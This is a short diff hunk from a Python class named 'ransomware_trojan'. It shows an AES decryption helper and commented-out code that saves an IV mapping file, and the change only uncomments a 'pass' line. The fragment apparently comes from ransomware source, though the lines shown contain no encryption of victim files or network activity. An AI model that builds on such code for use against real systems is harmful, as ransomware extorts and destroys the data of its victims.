@@ -80,7 +80,7 @@ class ransomware_trojan:
         decrypted = unpad(cipher.decrypt(ct_bytes), AES.block_size)
         return decrypted # Convert bytes back to string
     #def decrypt(self):
-      #  pass
+        pass
         # try:
         #     with open("iv_mapping.json", 'w') as file:
         #         json.dump(iv_mapping, file, indent=4)
